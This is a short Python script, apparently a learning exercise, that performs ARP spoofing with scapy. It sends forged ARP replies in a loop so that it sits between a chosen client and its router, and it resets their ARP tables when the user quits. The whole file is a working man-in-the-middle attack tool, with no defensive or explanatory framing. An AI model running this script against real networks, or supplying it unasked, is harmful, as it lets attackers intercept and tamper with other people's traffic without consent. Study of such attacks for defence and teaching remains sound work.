#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--client", dest="target_client", help="Target client IP address")
    parser.add_argument("-r", "--router", dest="target_router", help="Target Router IP address")
    arguments = parser.parse_args()
    if not arguments.target_client:
        parser.error("[-] Please enter a target client ")
    elif not arguments.target_router:
        parser.error("[-] Please enter a target router ")
    return arguments


arguments = get_arguments()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


client_ip = arguments.target_client
gateway_ip = arguments.target_router
sent_packets_count = 0
try:
    while True:
        spoof(client_ip, gateway_ip)
        spoof(gateway_ip, client_ip)

        sent_packets_count = sent_packets_count + 2

        print("\r[+] Packet Sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C\n[-] Resetting ARP tables.....\n[-] Quitting.....")
    restore(client_ip, gateway_ip)
    restore(gateway_ip, client_ip)

